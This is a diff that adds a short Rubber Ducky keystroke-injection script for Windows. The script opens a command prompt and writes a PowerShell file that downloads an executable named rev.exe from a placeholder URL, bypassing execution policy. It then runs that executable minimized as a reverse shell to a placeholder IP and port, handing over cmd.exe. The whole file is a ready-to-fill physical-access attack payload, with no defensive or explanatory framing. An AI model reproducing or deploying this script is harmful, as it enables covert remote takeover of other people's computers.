@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 1000
+
+STRING cmd
+ENTER
+DELAY 1000
+
+STRING cd / & mkdir win & cd win & echo (wget 'YOU KNOW WHAT DO PLACE HERE' -OutFile rev.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 3000
+
+STRING START /MIN rev.exe <IP ADDRESS> <PORT> -e cmd.exe -d & exit
+ENTER
